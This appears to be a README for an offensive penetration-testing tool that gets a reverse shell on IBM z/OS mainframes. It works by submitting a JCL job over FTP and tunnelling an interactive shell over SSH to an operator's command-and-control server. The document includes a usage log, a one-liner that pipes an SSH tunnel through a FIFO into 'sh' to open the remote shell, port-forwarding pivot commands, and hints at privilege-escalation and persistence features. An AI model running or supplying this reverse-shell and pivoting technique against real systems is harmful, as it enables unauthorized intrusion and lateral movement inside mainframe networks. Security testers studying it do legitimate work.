# zos-pivoting

I wanted a secure reverse shell, with builtin pivoting functions, On a mainframe!

This repo contains a few Python modules and scripts to get a secure reverse shell by submitting a JCL job via FTP on z/OS. Here's a verbose example:

```
$ python ftp2shell.py config.ini -v
Input the password for zuser on target.mainframe.net:
INFO:root:Auto-detecting the ssh server fingerprint
INFO:root:Generating SSH keys

Save the pulic key below in ~cc_user/.ssh/authorized_keys

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB[...]

Press Enter to continue...
INFO:root:Opening FTP connection to the target at target.mainframe.net
INFO:root:Generating temporary files for the shell
INFO:root:Uploading the SSH key on the target
INFO:root:Uploading the host fingerprint on the target
INFO:root:Creating the FIFO for the shell
INFO:root:Running the reverse SSH command
INFO:root:Shell preparation
INFO:root:Waiting for target.mainframe.net activation
target.mainframe.net> uname
OS/390
target.mainframe.net> help

Documented commands (type help <topic>):
========================================
EOF  _findapf  _runssh  exit  help

target.mainframe.net> exit
This will terminate the connection to target.mainframe.net, are you sure? (y/N) y
```

## Usage:
The main files are:
 * `config.ini` a sample configuration file
 * `ftp2shell.py` the main script, it uses the config file and the next items

To get a shell:
 * Edit `config.ini`
 * Run `python ftp2shell.py config.ini`. The script will:
    - connect to the mainframe via FTP
    - generate and run a JCL batch
    - start an SSH connection against `cc_server` and start a tunneled clear-text shell
    - start the shell management
 * The resulting shell is a nearly full-featured SH shell.
The SSH tunnelling protects the shell.
 * There is a custom `_runssh` command which can be used to run further SSH commands.
Think port forwarding and that goodness.
For example, to get access to TN3270 on your localhost run:
```
mainframe> _runssh -R 2222:127.0.0.1:23
```
And then connect to localhost:2222.
 * there is also a `_findapf` command there too. You should know what that is for :)

## Design
This project uses the SSH stdin and stout redirection to get a fully interactive reverse shell on a mainframe.
You need OpenSSH>=5.4.

Here is an example:

```
ssh -i $KEYNAME $CCU@$CCS -p $CCP -o UserKnownHostsFile=$KNOWNHOSTSFILE -o StrictHostKeyChecking=yes -N \
-W $NCIP:$NCP < $FIFONAME | sh -s > $FIFONAME 2>&1 & echo $STARTSEND > $FIFONAME'
```

SSH tunnels stdin and stdout, piping to a shell.
A FIFO file contains all the inputs and outputs to and from the shell.
Please note how awesome the strong host fingerprint checking and the key-based authentication are.

The same principle can be applied to other systems running SSH.

You have to do the cleanup on the mainframe by yourself.

Python >= 3.7 only.

## Requirements
You have to create a user in your machine to get the reverse connection on your `cc_server` (see the config file).
The user does not need an interactive shell.

## Dependencies
OpenSSH>=5.4.

Python >= 3.7.

You can install the [ebcdic](https://pypi.org/project/ebcdic/) package to support more character encodings.

The default EBCDIC support in Python 3 should be enough most of the time.

## Future Steps
* Automate the pivoting by parsing the output of netstat/NETSTAT and:
    - ssh -R
    - ssh -L
    - starting a local sshd
* Persistence via SSH keys (?)
* Port to other systems

## Can't do on z/OS
* Cannot automate running custom sshd server:
    * sshd has no run permissions for users by default
    * copying the binary to another path will not work, as a daemon need to be marked as `program controlled`
    * ***z/OS 2.4 will probably get the latest and greatest OpenSSH with full `-R` support***
